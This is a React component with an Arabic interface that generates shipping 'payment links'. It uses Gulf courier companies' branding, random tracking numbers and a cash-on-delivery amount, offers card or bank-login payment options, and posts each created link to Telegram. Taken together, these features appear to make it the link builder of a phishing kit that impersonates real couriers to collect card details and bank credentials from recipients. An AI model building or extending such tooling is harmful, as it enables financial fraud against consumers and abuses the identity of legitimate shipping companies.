import { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User, RefreshCw, ArrowRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateShippingLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "SA");
  const services = getServicesByCountry(country?.toUpperCase() || "SA");
  
  const generateTrackingNumber = () => {
    const prefix = selectedService.toUpperCase().substring(0, 3) || 'TRK';
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}${timestamp}${random}`;
  };

  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [payerType, setPayerType] = useState("recipient");
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");

  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);

  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const serviceBranding = useMemo(() =>
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );

  useEffect(() => {
    if (selectedService && !trackingNumber) {
      setTrackingNumber(generateTrackingNumber());
    }
  }, [selectedService]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedService || !trackingNumber) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول المطلوبة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "SA",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: trackingNumber,
          payer_type: payerType,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selected_bank: null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA',
        amount: parseFloat(codAmount) || 500,
        currency: getCurrencyCode(country || "SA"),
        paymentMethod: paymentMethod,
      });

      await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: trackingNumber,
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData?.nameAr || country,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setShowSuccessDialog(true);
      toast({ title: "تم الإنشاء بنجاح", description: "تم إنشاء رابط الشحن بنجاح" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
  };

  if (!countryData) return <div className="min-h-screen flex items-center justify-center">دولة غير صحيحة</div>;

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
              <Package className="w-5 h-5 text-white" />
            </div>
            <h1 className="font-black text-gray-800">نظام إصدار البوالص</h1>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-xl">
        <form onSubmit={handleSubmit} className="space-y-4">
           <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
              <div className="space-y-1.5">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">شركة الشحن</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-14 border-2 rounded-2xl font-black text-gray-700 bg-gray-50/50">
                    <SelectValue placeholder="اختر الشركة" />
                  </SelectTrigger>
                  <SelectContent>
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key} className="font-bold">{service.name}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {selectedService && serviceBranding && (
                <div className="p-4 rounded-2xl bg-blue-50 border border-blue-100 flex items-center gap-4 animate-in fade-in slide-in-from-top-2">
                  <img src={serviceBranding.logo} alt="" className="h-10 w-20 object-contain" />
                  <div>
                    <h4 className="font-black text-blue-900 text-sm">{selectedServiceData?.name}</h4>
                    <p className="text-[10px] font-bold text-blue-700/70">{serviceBranding.description}</p>
                  </div>
                </div>
              )}

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الشحنة</Label>
                  <div className="relative">
                    <Input value={trackingNumber} onChange={(e) => setTrackingNumber(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
                    <Hash className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                    <button type="button" onClick={() => setTrackingNumber(generateTrackingNumber())} className="absolute left-2 top-1/2 -translate-y-1/2 p-1.5 bg-white rounded-lg shadow-sm border text-blue-600">
                      <RefreshCw className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
                <div className="space-y-1.5">
                   <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ (COD)</Label>
                   <div className="relative">
                     <Input type="number" value={codAmount} onChange={(e) => setCodAmount(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || "SA")}</div>
                   </div>
                </div>
              </div>

              <div className="space-y-1.5">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">من سيدفع الرسوم؟</Label>
                <div className="grid grid-cols-2 gap-2">
                  {["recipient", "sender"].map((type) => (
                    <button
                      key={type}
                      type="button"
                      onClick={() => setPayerType(type)}
                      className={`h-12 rounded-xl border-2 font-black text-sm transition-all ${payerType === type ? 'border-blue-600 bg-blue-50 text-blue-600' : 'border-gray-100 bg-white text-gray-400'}`}
                    >
                      {type === "recipient" ? "المستلم" : "المرسل"}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1.5">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">وصف الشحنة</Label>
                <div className="relative">
                  <Input value={packageDescription} onChange={(e) => setPackageDescription(e.target.value)} placeholder="مثال: ملابس، عطور..." className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
                  <Package className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                </div>
              </div>

              <div className="space-y-1.5 pt-2">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">طريقة الدفع المتاحة للعميل</Label>
                <div className="grid grid-cols-2 gap-3">
                  <button type="button" onClick={() => setPaymentMethod('card')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'card' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}>
                    <CreditCard className={`w-6 h-6 ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-300'}`} />
                    <span className={`text-[10px] font-black uppercase ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-400'}`}>بطاقة بنكية</span>
                  </button>
                  <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'bank_login' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}>
                    <Building2 className={`w-6 h-6 ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-300'}`} />
                    <span className={`text-[10px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-400'}`}>دخل بنكي</span>
                  </button>
                </div>
              </div>
           </Card>

           <Button type="submit" disabled={isSubmitting || !selectedService} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl bg-blue-600 hover:bg-blue-700 text-white transition-all active:scale-95">
             {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : "إصدار بوليصة الشحن"}
           </Button>
        </form>
      </main>

      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-8 text-center space-y-6">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center animate-bounce">
                  <RefreshCw className="w-6 h-6 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-2xl font-black text-gray-900">تم إنشاء البوليصة!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط الدفع بنجاح لهذه الشحنة</AlertDialogDescription>
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
                {createdPaymentUrl}
              </div>

              <div className="flex gap-3">
                 <Button onClick={handleCopyLink} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
                   {copied ? "تم النسخ!" : <><Copy className="w-4 h-4" /> نسخ الرابط</>}
                 </Button>
                 <Button onClick={() => window.open(createdPaymentUrl, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
                   <ExternalLink className="w-4 h-4" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccessDialog(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-24" />
      <BottomNav />
    </div>
  );
};

export default CreateShippingLink;
